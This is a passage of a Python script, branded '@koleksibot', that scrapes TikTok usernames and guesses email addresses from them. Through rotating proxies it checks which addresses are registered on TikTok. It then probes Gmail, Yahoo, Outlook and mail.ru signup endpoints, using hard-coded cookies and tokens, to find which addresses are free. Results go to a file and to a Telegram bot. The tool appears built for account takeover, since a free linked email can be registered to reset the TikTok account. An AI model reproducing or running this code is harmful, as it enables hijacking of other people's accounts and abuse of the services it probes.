RVoA8A2K5xWUMmPrd657A2gGKeT0%2FthL%2FZpHTSOLLd5RA9VTKXNVu3xE%2FF0OKQ1HTp4p35M4FJV6eheJOiPgcU1BMuZKMXCXf7x0bpCevEXIeSYaD8pQJHLPXyCj%2BpWzjzNdBhOjbtSdloonEyHvrm19UB10QxDR%2B2fMLKJIDKQJtgYFjQhXGUxGpEmPTQ0uekJZ48ej2Gji1tqWlseMOMipg0S1Rgta7MWQQ3EL88J7u9PJf9soLTOaf7Pqqs%2BobulcEsjxv9aPwILr15ZMfdspWg%2Btx8%2BN5b%2B0uYMSwh%2FOdeMCHS8DONFUKN%2BI8ln3tV0kFaqPNNdHTbwJzbPv1a0Y7v%2FCaqPOoAqXPwpUxmI%2FzgQtCgJ91Raj%2F%2BPNzxDn6JxE7nUIo1X%2BjUwerAkQ2Dygy8Fho%2Bw1BYfihj03CZhjS1krj8Vd04aQabeKSZVzdjfCdpkfzwFHfi77iq6vKPHsQmsZadPFf6aXVazYE6SrXj4RRbaoBsW%2BtJ9PGpu3En9CgvKk9JrArFBq4qRM56H2C%2FwIoUQxYEFQgxiB9RYZMF1ZHmTluTqYOak6GO%2Fw7D%2FZjhBWtnBlpTbMafcrExzCy0YuUklTs5v3gQ6uMdvpWo60FlSd4TBhgRu%2BoyOMzxC2U7swA8JqWlfnvrlX0NmrSYKNHzloPAfpXINg7IR4%2BP2vdHHyEu%2FdymeKI4b3cS8fEDC%2BIr4D%2BfXa1edNyqPdFIFmvKGZeVRDuIXNXM%2BjZLLAD7R8Pw%2FRXC5X%2FgGXX01HU4Ma7vPcIcoUY0HpYRohxZHbuvlCxlbj6MMteOXJJPtgiN7z%2BjC6eyognmaE%2BWWeg4uemCw8mw0Ld2mKorywvWbu4DvOBaXuivqtDfkH5b%2BQstz493hTZ5ovVuAssLygF6US%2FFabYr3KxoyEjmhYpvsA45wctYfcjmFwdf1QT2wQz%2FOoskWn1fCsGKCU6OCb%2BHBCQa5KCSN5y%2FNpOWXUIyB3Z5jQXrs3%2F%2BcWGRkm6fDXJHiASkDuhaJuhg%2BHXaFPTGouoi%2BDpseLIE6QDjIhgVsm2WKIlTJfAekOEQMW8IPzFjABJrdWgZg08BqHIwFTSoMgz6DCT3xP%2BpCZE9xkzXCsPKgtvjqAyVrc8rQWvC2XznQYahjmw%2FTPz10lDVAlH41I8XP132BqPUv5jy3tmjQTFeIkbfH%2BQoe2HN4rHa07AwLHP6Y0gDQqIkbY4lPUoHNPeS6jVXnb6d%2FGFRl8tTKg4QCEaZX3lwzjjXXVAlmz%2BZ0wc1jGXRclTPTNnR%2BvklAjqPIypAz%2BR9tx4rLe5jHLXuCy0LHuIdb5OLrCF%2Fgr1MCywGJHpNao4oeukqk6OPPtFN8eYplJy8tnNwoJSsoNrXR1iNFIt%2F3VZRtgOQvrGQ7x0AXwvVqX6Vt%2BYzQ3WWQdu%2BBI9CsFPE7IX4Ek1ZJ97r1%2BREvommgXkRii4pYbZPEGbkgVMcI42x94LtVEM2ZXqsJyAaQY9rX7bsSAahgp3udxAGzoa%2FjTs6tW1oD6sBin1kcjElZbkBI80DCV2rka9LDImH9ZM7NDDU6leamdb2oJCAmB1YMXozgIV5kpMgbVr1%2BdAPuJX3lKyk9kWI9VrBCtmMo%3D%7CjUP9j77GikcMDQ84gY3nfg%3D%3D%7CIM7sEaFvNp%2BZ6Fsp6b915A%3D%3D&tos0=oath_freereg%7Cxa%7Cen-JO&firstName=&lastName=&userid-domain=yahoo&userId={email}&password=&birthYear=&signup='
					p = {'validateField': 'userId',}
					response = requests.post('https://login.yahoo.com/account/module/create', params=p,cookies=cook,headers=headers, data=data).text
					if 'userId' in response:
						print(' - '*9)
						print(email)
						print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Red}x{White}]')
						print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
						print(' - '*9)
						print('\n')
					else:
						print(' - '*9)
						print(email)
						print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Green}✓{White}]')
						print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
						if SEND == True:
							
							requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=Email : {email}\n - By @koleksibot')
						open('done.txt','a').write(email+'\n')
						print(' - '*9)
						print('\n')
				
	
			
			
			
			
			
				if domen == 'mail':
					headers_6 = {
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
					url = 'https://account.mail.ru/api/v1/user/exists'
					data_6 = {'email': email}
					js = requests.post(url, data=data_6, headers=headers_6)
					if js.json()['body']['exists'] == False:
						print(' - '*9)
						print(email)
						print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Green}✓{White}]')
						print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
						print(' - '*9)
						print('\n')
						
						if SEND == True:
							
							requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=Email : {email}\n - By @koleksibot')
						open('done.txt','a').write(email+'\n')
					else:
						print(' - '*9)
						print(email)
						print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Red}x{White}]')
						print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
						print(' - '*9)
						print('\n')
				if  domen =='outlook':
					url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + email + "&_=1604288577990"
					data = ''
					headers = {
	"Accept": "*/*",
	"Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Connection": "close",
    "Host": "odc.officeapps.live.com",
    "Accept-Encoding": "gzip, deflate",
    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
    "uaid": "d06e1498e7ed4def9078bd46883f187b",
    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
					html = requests.get(url, data=data, headers=headers).text
					if 'Neither' in html:
						print(' - '*9)
						print(email)
						print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Green}✓{White}]')
						print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
						
						if SEND == True:
							
							requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=Email : {email}\n - By @koleksibot')
						open('done.txt','a').write(email+'\n')
						print(' - '*9)
						print('\n')
					else:
						print(' - '*9)
						print(email)
						print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Red}x{White}]')
						print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
						print(' - '*9)
						print('\n')
				
			elif '{"is_registered":0}' in r.text:
				print(' - '*9)
				print(email)
				print(f'TIKTOK{White}  [{Red}x{White}] || Email {White}[{Red}x{White}]')
				print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
				print(' - '*9)
				print('\n')
			else:
				
				print('-- Blocked --')
				return False
				
				


















print(f'''


{Red}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                   TIKTOK SCAP{White}PER TOOLS⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   {Yellow}[{Red}1{Yellow}]{White} - Dari Gmail           {Yellow}[{Red}2{Yellow}]{White} - Dari Hotmail

   {Yellow}[{Red}3{Yellow}]{White} -  Dari Outlook         {Yellow}[{Red}4{Yellow}]{White} - Dari Yahoo

               {Yellow}[{Red}5{Yellow}]{White} -  Dari mail.ru         
               
               {Yellow}[{Red}99{Yellow}]{White} - KELUAR PROGRAM
               {Yellow}
   - - - - - - - - - - - - - - - - - - -
  {White}
       {Yellow}       Fanspage {White}: koleksibot
  
  
''')
_=f'{Yellow}[{White}+{Yellow}]{White} -'
try : 
	choose=int(input(_+'  Choose : '))
except ValueError :
	print('\n')
	print(Red+'ERORR - Choose numper ')
	print('\n')
	choose=int(input(_+'  Silakan Pilih : '))
	print('\n')
if choose == 99:
	exit()

if choose == 1:
	domen = 'gmail'
elif choose == 2:
	domen = 'hotmail'
elif choose == 3:
	domen = 'outlook'
elif choose == 4:
	domen = 'yahoo'
elif choose == 5:
	domen ='mail'
elif choose == 6:
	domen = 'all'


Send=str(input(f'''{Yellow}[{White}-{Yellow}] - {White} Kirim Hasil Ke Telegram BOT  y/n >>> '''))  
if Send == 'y':
	SEND=True
elif Send == 'n' :
	SEND=False
elif Send == 'Y':
	SEND=True
elif Send == 'N' :
	SEND=False
else :
	print('choose Y or N ! 🤨 \n ')
	Send=str(input(f'''{Yellow}[{White}-{Yellow}] - {White} Kirim Hasil Ke Telegram BOT  y/n >>> ''')) 
	if Send == 'y':
		SEND=True
	elif Send == 'n' :
		SEND=False
		Token=''
		ID=''
	elif Send == 'Y':
		SEND=True
	elif Send == 'N' :
		SEND=False
		Token=''
		ID=''
if SEND == True:
	Token=input(_+'  Token : ')
	ID=input(_+'  ID : ')	
	requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text= Done Started \n - By @koleksibot')

if(SEND) == False :
	Token=''
	ID=''


if domen != 'all' :
	
	exp=ex(domen,SEND,Token,ID)
	while True:
		if exp == False:
			for i in range(999):
					Seconds(1)
					print(f'\rWhite : {999-i}',end="")
			exp=ex(domen,SEND,Token,ID)
	
else :
	pass



i=0
if domen=='all':
	Block = False
	wait = False
	while True :
				if Block == True :
					print('-- Blocked --')
					for i in range(999):
						Seconds(1)
						print(f'\rWhite : {999-i}',end="")	
				Block=False
				if wait == True :
					print('-- wait --')
					for i in range(22):
						Seconds(1)
						print(f'\rWhite : {22-i}',end="")	
				wait=False
				countr = ['KW','SA','IN','EG','IR','YE']
				country=random.choice(countr)
				if country == 'KW':
					num=30
				elif country == 'SA' :
					num=47
				elif country == 'IN' :
					num=83
				elif country == 'EG' :
					num=62
				elif country == 'IR' :
					num=21
				elif country == 'YE' :
					num=12
				try:
					req=requests.get(f'https://www.tiktok.com/api/recommend/item_list/?aid=1988&app_language=en&app_name=tiktok_web&battery_info=1&browser_language=ar&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F105.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&count={num}&device_id=7100953081626560002&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=&is_fullscreen=false&is_page_visible=true&os=windows&priority_region={country}&referer=&region={country}&screen_height=900&screen_width=1440&tz_name=Asia%2FKuwait&webcast_language=en&msToken=RjTTFgGpN-Hp8PjGwr2FF0E1UUE2SOZH8L3xb4C4Gf5j3N_ji4zWHtzhnRL_vCBmg5GI2XoOK8jkIWFw2DCMHyQIoLr0HBE6wBvYwNtGqI-ozOsbC5LIoSOeo_Pr4xoWcwwjXtRx&X-Bogus=DFSzswVLpWtANydASsdSdQYklTIB&_signature=_02B4Z6wo00001MOxumgAAIDBHcfiz5.AGVzDsb7AAFPN05')
					just_test=req.json()['itemList']
				except : 
					continue
				for id in req.json()['itemList']:
					sleep=[1,3,6,4,2,0,5]
					seconds=random.choice(sleep)
					print('\n\n\n')
					i+=1
					pro=['207.180.204.105:3128\n', '94.242.54.119:3128\n', '124.204.33.162:8000\n', '139.59.1.14:3128\n', '103.47.67.154:8080\n', '112.6.117.178:8085\n', '209.97.150.167:3128\n', '201.217.49.2:80\n', '173.212.229.53:3128\n', '182.253.191.132:8080\n', '124.156.100.105:8118\n', '103.144.102.57:8080\n', '217.30.170.213:3128\n', '201.91.82.155:3128\n', '193.31.27.123:80\n', '182.90.224.115:3128\n', '206.189.23.38:8048\n', '119.15.86.130:8080\n', '201.140.208.146:3128\n', '182.101.207.11:8080\n', '129.213.183.152:80\n', '200.106.187.245:999\n', '94.75.76.3:8080\n', '77.247.225.49:3128\n', '20.113.24.12:8080\n', '194.233.77.110:6666\n', '103.164.99.58:8181\n', '120.26.14.114:8888\n', '05.252.161.48:8080\n', '103.181.245.149:8080\n', '67.212.83.54:1080\n', '103.231.78.36:80\n', '114.4.104.254:3128\n', '58.254.141.70:8998\n', '116.58.254.59:8080\n', '176.102.66.197:8888\n', '134.209.111.123:3128\n', '103.110.91.242:3128\n', '31.131.67.14:8080\n', '85.195.104.71:80\n', '62.69.212.197:8090\n', '103.152.232.51:8080\n', '45.148.123.27:3128\n', '122.52.219.36:8080\n', '187.217.54.84:80\n', '5.56.133.132:3128\n', '202.166.165.114:8000\n', '170.233.235.249:3128\n', '181.224.207.21:999\n', '102.68.135.229:8080\n', '103.23.206.170:8080\n', '103.156.217.203:8080\n', '197.155.158.22:80\n', '103.242.105.86:3128\n', '45.156.29.126:9090\n', '45.149.43.56:53281\n', '181.10.160.156:8080\n', '36.67.57.45:30066\n', '103.145.57.109:8080\n', '1.71.132.64:30003\n', '88.132.95.93:53281\n', '200.54.22.74:8080\n', '101.200.127.149:3129\n', '47.74.152.29:8888\n', '107.172.73.179:7890\n', '91.230.199.174:61440\n', '110.78.114.161:8080\n', '156.200.116.68:1981\n', '54.39.102.233:3128\n', '36.68.44.34:8080\n', '139.9.64.238:443\n', '60.21.210.178:10808\n', '181.10.117.254:999\n', '202.180.20.66:8080\n', '185.78.67.133:3128\n', '14.207.85.37:8080\n', '103.248.93.5:8080\n', '209.146.19.61:55443\n', '185.242.86.9:8080\n', '177.105.232.114:8080\n', '45.127.56.194:84\n', '197.248.184.158:53281\n', '181.48.23.250:8080\n', '201.184.176.107:8080\n', '103.114.98.217:6000\n', '67.212.83.55:1080\n', '35.240.63.166:3128\n', '159.196.222.215:8080\n', '190.61.84.166:9812\n', '178.54.21.203:8081\n', '91.233.111.49:1080\n', '190.2.210.249:999\n', '103.172.70.18:8080\n', '181.191.140.134:999\n', '187.1.88.106:3128\n', '45.180.10.197:999\n', '36.89.156.146:8080\n', '45.7.177.238:34234\n', '45.71.115.203:999\n', '157.119.211.133:8080\n', '105.243.252.21:8080\n', '115.124.75.33:8080\n', '43.243.172.18:83\n', '216.137.184.253:80\n', '103.144.18.94:8083\n', '103.134.97.49:83\n', '201.157.254.26:8080\n', '177.128.44.131:6006\n', '80.244.231.133:8080\n', '85.121.208.223:2019\n', '82.165.21.59:80\n', '41.65.174.120:1976\n', '138.199.15.141:8080\n', '138.117.231.130:999\n', '110.170.126.13:3128\n', '110.232.66.209:808\n', '197.232.135.174:41890\n', '165.16.27.33:1976\n', '176.214.97.13:8081\n', '151.22.181.214:8080\n', '139.255.5.98:8080\n', '209.97.150.167:8080\n', '38.127.179.79:29602\n', '193.138.146.67:3128\n', '119.184.185.80:8118\n', '18.196.34.179:37881\n', '154.236.177.101:1981\n', '103.123.64.234:3128\n', '139.59.249.244:7777\n', '5.104.174.199:23500\n', '43.243.174.3:82\n', '1.203.115.191:30003\n', '111.225.152.141:8089\n', '200.54.25.226:8080\n', '103.156.15.34:8080\n', '111.118.135.132:56627\n', '202.62.10.51:8082\n', '125.25.82.190:8080\n', '36.94.183.153:8080\n', '185.110.211.217:8080\n', '134.19.254.2:21231\n', '207.180.217.107:3128\n', '78.186.85.127:10001\n', '103.131.18.119:8080\n', '185.51.10.19:80\n', '103.105.228.66:8080\n', '103.41.212.230:44759\n', '103.159.90.42:83\n', '188.133.173.21:8080\n', '202.164.152.233:8080\n', '182.253.73.130:8080\n', '203.189.89.158:8080\n', '181.176.221.151:9812\n', '93.86.63.73:8080\n', '103.37.141.69:80\n', '173.82.149.243:8080\n', '190.90.242.210:999\n', '36.255.86.114:83\n', '218.86.87.171:31661\n', '88.1.165.103:3128\n', '212.164.52.198:80\n', '41.65.236.37:1976\n', '181.129.2.90:8081\n', '196.202.215.143:41890\n', '156.200.110.116:1976\n', '190.220.1.173:56974\n', '43.250.127.98:9001\n', '47.112.122.163:82\n', '179.255.219.182:8080\n', '188.170.251.195:8080\n', '46.161.195.105:1981\n', '93.240.4.54:3128\n', '177.220.188.213:8080\n', '50.233.228.147:8080\n', '140.227.127.205:80\n', '213.230.121.116:3128\n', '178.210.51.118:8080\n', '91.211.246.30:3128\n', '118.163.13.200:8080\n', '189.203.234.146:999\n', '213.212.210.252:1976\n', '41.65.236.37:1981\n', '183.89.143.134:8080\n', '190.2.210.186:999\n', '112.124.56.162:8080\n', '125.25.32.214:8080\n', '202.62.52.4:8080\n', '149.34.2.39:8080\n', '193.233.162.65:8080\n', '212.64.72.199:8080\n', '161.97.123.237:3128\n', '36.93.18.141:9812\n', '95.0.168.46:1981\n', '131.72.69.202:40033\n', '181.204.44.235:999\n', '172.97.119.193:8181\n', '203.189.137.180:9812\n', '103.79.74.193:53879\n', '167.114.185.69:3128\n', '203.112.223.126:8080\n']
					prox=random.choice(pro)
					proxies={
					'http':f'http://{prox}',
					'socks4':f'socks4://{prox}',
					'socks5':f'socks5://{prox}',
					}
					
					email=(id['author']['uniqueId'])
					domens=[
							'@gmail.com','@yahoo.com',
							'@outlook.com','@hotmail.com']
					domen=random.choice(domens)
					mail=email+domen
					coder = "https://www.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A%22ios%22%2C%22referer%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Fprofile%22%2C%22root_referer%22%3A%22https%3A%2F%2Fwww.google.com%22%2C%22cookie_enabled%22%3Atrue%2C%22screen_width%22%3A390%2C%22screen_height%22%3A844%2C%22browser_language%22%3A%22en-us%22%2C%22browser_platform%22%3A%22iPhone%22%2C%22browser_name%22%3A%22Mozilla%22%2C%22browser_version%22%3A%225.0%20%28iPhone%3B%20CPU%20iPhone%20OS%2014_4%20like%20Mac%20OS%20X%29%20AppleWebKit%2F605.1.15%20%28KHTML%2C%20like%20Gecko%29%20Version%2F14.0.3%20Mobile%2F15E148%20Safari%2F604.1%22%2C%22browser_online%22%3Atrue%2C%22timezone_name%22%3A%22Asia%2FRiyadh%22%2C%22is_page_visible%22%3Atrue%2C%22focus_state%22%3Atrue%2C%22is_fullscreen%22%3Afalse%2C%22history_len%22%3A17%2C%22battery_info%22%3A%7B%7D%7D&msToken=vPgBDLGXZNEf56bl_V4J6muu5nAYCQi5dA6zj49IuWrw2DwDUZELsX2wz2_2ZYtzkbUF9UyblyjQTsIDI5cclvJQ6sZA-lHqzKS1gLIJD9M6LDBgII0nxKqCfwwVstZxhpppXA==&X-Bogus=DFSzsIVLC8A-dJf6SXgssmuyRsO1&_signature=_02B4Z6wo00001dTdX3QAAIDBDn9.7WbolA3U3FvAABfU8c"
					data = f"email={mail}&aid=1459&language=en&account_sdk_source=web&region=SA"
					hed = {
						"User-Agent": generate_user_agent()}
					Seconds(seconds)
					r = requests.post(coder,headers=hed,data=data,proxies=proxies)
					
					if '{"is_registered":1}' in r.text:
						
						if domen =='@gmail.com':
							url = 'https://android.clients.google.com/setup/checkavail'
							headers = {
						'Content-Length': '98',
		        'Content-Type': 'text/plain; charset=UTF-8',
		        'Host': 'android.clients.google.com',
		        'Connection': 'Keep-Alive',
		        'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)',}
							data = json.dumps({
			          'username': mail,
			          'version': '3',
			          'firstName': '3mk',
			          'lastName': 'Coder' })
							res = requests.post(url, data=data, headers=headers).json()['status']
							if res == 'SUCCESS':
								print(' - '*9)
								print(mail)
								print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Green}✓{White}]')
								print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
								if SEND == True:
									
									requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=Email : {mail}\n - By @koleksibot')
								open('done.txt','a').write(mail+'\n')
								print(' - '*9)
							else:
								print(' - '*9)
								print(mail)
								print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Red}x{White}]')
								print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
								print(' - '*9)
								print('\n')
						elif   domen =='@hotmail.com':
							url = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress=" + mail + "&_=1604288577990"
							data = ''
							headers = {
			"Accept": "*/*",
			"Content-Type": "application/x-www-form-urlencoded",
		    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
		    "Connection": "close",
		    "Host": "odc.officeapps.live.com",
		    "Accept-Encoding": "gzip, deflate",
		    "Referer": "https://odc.officeapps.live.com/odc/v2.0/hrd?rs=ar-sa&Ver=16&app=23&p=6&hm=0",
		    "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
		    "canary": "BCfKjqOECfmW44Z3Ca7vFrgp9j3V8GQHKh6NnEESrE13SEY/4jyexVZ4Yi8CjAmQtj2uPFZjPt1jjwp8O5MXQ5GelodAON4Jo11skSWTQRzz6nMVUHqa8t1kVadhXFeFk5AsckPKs8yXhk7k4Sdb5jUSpgjQtU2Ydt1wgf3HEwB1VQr+iShzRD0R6C0zHNwmHRnIatjfk0QJpOFHl2zH3uGtioL4SSusd2CO8l4XcCClKmeHJS8U3uyIMJQ8L+tb:2:3c",
		    "uaid": "d06e1498e7ed4def9078bd46883f187b",
		    "Cookie": "xid=d491738a-bb3d-4bd6-b6ba-f22f032d6e67&&RD00155D6F8815&354"}
							html = requests.get(url, data=data, headers=headers).text
							if 'Neither' in html:
								print(' - '*9)
								print(mail)
								print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Green}✓{White}]')
								print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
								if SEND == True:
									
									requests.get(f'https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text=Email : {mail}\n - By @koleksibot')
								open('done.txt','a').write(mail+'\n')
								print(' - '*9)
								print('\n')
							else:
								print(' - '*9)
								print(mail)
								print(f'TIKTOK{White}  [{Green}✓{White}] || Email {White}[{Red}x{White}]')
								
								print(f'{Yellow}Telegram - By {White}:{Red} @koleksibot {White}')
								print(' - '*9)
								print('\n')
						elif  domen =='@yahoo.com':
							headers = {
					'authority': 'login.yahoo.com',
				  'accept': '*/*',
				  'accept-language': 'en-US,en;q=0.9',
				  'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		      'origin': 'https://login.yahoo.com',
		      'referer': 'https://login.yahoo.com/account/module/create?intl=xa&specId=yidregsimplified&context=reg&done=https%3A%2F%2Fwww.yahoo.com',
		      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
		      'sec-ch-ua-mobile': '?0',
		      'sec-ch-ua-platform': '"Windows"',
		      'sec-fetch-dest': 'empty',
		      'sec-fetch-mode': 'cors',
		      'sec-fetch-site': 'same-origin',
		      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
		      'x-requested-with': 'XMLHttpRequest',
		}
							cook = {
							'A3': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
						  'A1': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc',
						  'A1S': 'd=AQABBCLFxGICENehR8BnUi6pQUzqCTsE5goFEgEBAQEWxmLOYgAAAAAA_eMAAA&S=AQAAAhjVtyai82Rrxg2CK5FMdUc&j=WORLD',
						  'AS': 'v=1&s=0sHA17fo&d=A62cb7327|5xRp8pr.2UJmOAqR8uAJglbFObbsH8uOznbuKM00ySlD8Ha.X4jNUXo4VEjGrKs97pN8kPAqzIf1jQcTQp5veb991hp7CXQa18n8eMvtp0i3TKdzY_snYqc41YJj1lVf5YXbOhZFbUgbZ2.BI5VJuQoxc9BfU6gFuHcokkx86DndLRGqMpFyzmFeAViTx6LSbPs2soSDVxJyEtCeBln32VP6QDigRPlUzpL8mrluwSF4NXjjJg3kpS308GYePy96Pznh3CvVja7A0RUIQanRzwQWoKX7u3c5Kgak5jZEasYEQHnqWNCzZXZn5j7BKRKruJ3nhcjBB0BD7YCmViG7NYR1QnbCOntbcWVTvhgr3v7fYIg5cx93ChX3TrMiqfnj.h35U2rNdLWlilATg3BEysTnYSjSIsKcQYnA4C9vzP8Db7tHidwbS1cCjttg.aOyemeymvsE2Y_FsfkK4Qeqx6b0cwqrM7IqzCp0vQp5I_87QmIk8boy4dYeyswIGcdnkLJb45mKMh3DsI5vMN7xyTRhJYO7JVMisaK0Zw8EyrG8z8hCgnozUBv3LpyJjxqbGQGcNBkvn7lhWZgLvsNoBUgVaTEYw5UC0aG7QCh2U7KF9qvv9O0CMZor7aubtx3Z.7SKZVAo7f1yPc4huhhlghkzbNn4BQBL0Fx0dEjQ3Df54gjiOVp5AcJlGM9qlkjbIMDQlg2n_LDedAwQgRoyvPxyrP.Tvqua0OFVi_LUaamtbNsS1SgmJTKobw2K3R39VKy9gcA0vieC9MvgkXQI._E_vz1BtEav0E6RsD2cD.k9j0Jw2brizvfy1wfr6vWoC1bqTMwiEzNGjsX0ug9Yf.yzteWwiWeIAbBG5aSyw9r4O_D9AIig62YIj6y5ERN1msWLRSFv3Dj.ExQ2ek7xuSeN7qW5EIh.4Pnvbm1WNv1TXVuw23WA7HV7WtEiOkfFDs5DvjhLX4MIU_Bt.gpZAcg89Yg-~A|B62cb779f|5f1yTBf.2Tq2W7LQ3KsSFbticESMze16y.0N0bOBd_EFQ_q1.moN9y.T_Vf0mwzJRub.9SzesA7Pzge4dwE_n84Jwg31ipQlUd7uIpky29J0EB2spihP_9ukbwI3MhWdMnds18q42N5ajt9kgn10vdAx5Fp9sNFAbXVl0op1I9bNGrfuz_4_P.a8Eoak702B2ebotX0YdNYct.IJ66Qfd8D.3g1ymlmnHxr7Y2IwJYCg15oQyQBeF8Z7DNW8_kZrP1s6dSZpd75ZI6wro_Rwh2ubvUely.oxpRFUTM2Vlh_VxnvDBDkBPaUC6OO0POVyPIbbCYKUWCVKcMQ_iVYhT.Nh0hntrcppxtz4BVp0rB6jAeb8nc0CrwSFRXP4uo8ICcsK22LsRqH7GWqqpQgrgZC51xJoFGph.Z4ZIX8fMu80u4Eh7lVx4emSGoO3UfrvvkL1RFWxHBfnSxeTmc3dYdPIpJj18qWQShVerqs1UcsB7Hxh67QTx1d2VqqKH9y044pHa55bjeSRnOkIYdHYv2us5rQSEw_04BBRBPAgbSnWrl9COJvpVTVeMF6ykV1.TJzQCKltU4uRTKiQIKfy9vGJuiKjwjFc7h1V5S9Y8Jd69EaDEb1XCaeOAruPYJqc9MINCeycUQFqhxUoHKUORcK9RV_9EINbPwgiB290jhdk3mEffmVI8a8RCcIpiW5dwUCgMkrBb90ebetwP_I9I5fke_USUYS3KtIsOq7L8APsJ4lCmwOdfAPm9OWyLz20bOdk0CidwpDFrqqxQt2JfUe_oyJB8FdZRfmcGmvjrnZm6blzGzUbFnxxJ.5ydhPjmf345BXcxnS3E.U0emkN4Wc0V.xzM_hkQh.oCeqWzSqf15eHZRSoLUusEUA.31Md9l67W_lNcQ.6nASTIWxr_q0l8jjGSGyiyJY-~A',
				}
				      	
				      	
							data = f'browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A4%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A420%2C%22timezone%22%3A%22America%2FLos_Angeles%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Intel)~ANGLE%20(Intel%2C%20Intel(R)%20HD%20Graphics%203000%20Direct3D9Ex%20vs_3_0%20ps_3_0%2C%20igdumd64.dll)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C